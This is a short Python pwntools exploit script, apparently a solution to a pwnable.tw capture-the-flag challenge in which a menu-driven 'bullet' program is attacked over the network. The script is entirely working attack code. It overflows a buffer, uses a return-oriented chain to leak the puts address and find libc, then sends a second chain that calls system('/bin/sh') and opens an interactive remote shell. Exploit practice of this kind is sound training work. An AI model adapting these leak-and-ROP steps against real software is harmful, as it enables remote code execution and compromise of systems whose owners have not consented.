#!/usr/bin/env python3

import pwn

io = pwn.remote('chall.pwnable.tw', 10103)
libc = pwn.ELF('./libc_32.so.6')

def create(desc):
	io.sendline(str(1))
	io.recvuntil('Give me your description of bullet :')
	io.sendline(desc)

def powerup(desc):
	io.sendline(str(2))
	io.recvuntil('Give me your another description of bullet :')
	io.sendline(desc)

def beat():
	io.sendline(str(3))
	io.recvuntil('Oh ! You win !!\n')

def rop_round():
	io.recvuntil('Your choice :')
	create('A' * 44)
	io.recvuntil('Your choice :')
	powerup('A' * 4)

	io.recvuntil('Your choice :')

	# the menu will run again due to the trailing '\n'
	io.recvuntil('Your choice :')

"""
first round: leak libc address
"""

rop_round()

puts_plt = 0x80484a8
puts_got = 0x804afdc
main = 0x08048954

payload = b'\xff\xff\xff' + b'AAAA' + pwn.p32(puts_plt) + pwn.p32(main) + pwn.p32(puts_got)
powerup(payload)
io.recvuntil('Your choice :')
beat()

puts_libc = pwn.u32(io.recv()[0:4])
base = puts_libc - libc.sym[b'puts']
system_libc = base + libc.sym[b'system']
shell_libc = base + next(libc.search(b'/bin/sh\x00'))

"""
second round: get shell
"""
io.sendline('')
rop_round()

payload = b'\xff\xff\xff' + b'AAAA' + pwn.p32(system_libc) + pwn.p32(main) + pwn.p32(shell_libc)
powerup(payload)
io.recvuntil('Your choice :')
beat()

io.interactive()
